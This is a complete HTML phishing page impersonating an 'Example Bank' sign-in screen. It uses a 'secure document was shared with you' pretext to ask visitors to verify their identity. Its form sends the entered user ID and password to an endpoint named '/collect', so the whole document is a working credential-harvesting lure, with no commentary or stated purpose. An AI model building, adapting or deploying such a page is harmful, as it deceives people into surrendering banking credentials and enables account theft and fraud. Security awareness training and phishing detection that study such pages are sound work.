<!doctype html><html lang="en"><head><meta charset="utf-8"><title>Example Bank | Sign in to view your document</title>
<meta name="viewport" content="width=device-width,initial-scale=1"><style>body{margin:0;font:16px -apple-system,Helvetica,Arial;background:#eef2f7;color:#1d2939}
header{background:#0b3d91;color:#fff;padding:14px 28px;font:600 20px Georgia,serif}
.card{max-width:380px;margin:48px auto;background:#fff;padding:32px;border-radius:12px;box-shadow:0 2px 14px #0002}
label{display:block;margin:14px 0 4px;font-size:14px}input{width:100%;box-sizing:border-box;padding:11px;border:1px solid #98a2b3;border-radius:6px;font:inherit}
button{margin-top:20px;width:100%;padding:12px;border:0;border-radius:6px;background:#0b3d91;color:#fff;font:600 16px inherit}
.small{font-size:13px;color:#667085;text-align:center;margin-top:14px}</style></head>
<body><header>Example Bank</header>
<div class="card"><h2 style="margin-top:0">Sign in to view the shared document</h2>
<p class="small">A secure document was shared with you. Verify your identity to continue.</p>
<form method="post" action="/collect">
<label for="u">User ID</label><input id="u" name="userid" autocomplete="username">
<label for="p">Password</label><input id="p" name="password" type="password" autocomplete="current-password">
<button>Sign in</button></form></div></body></html>
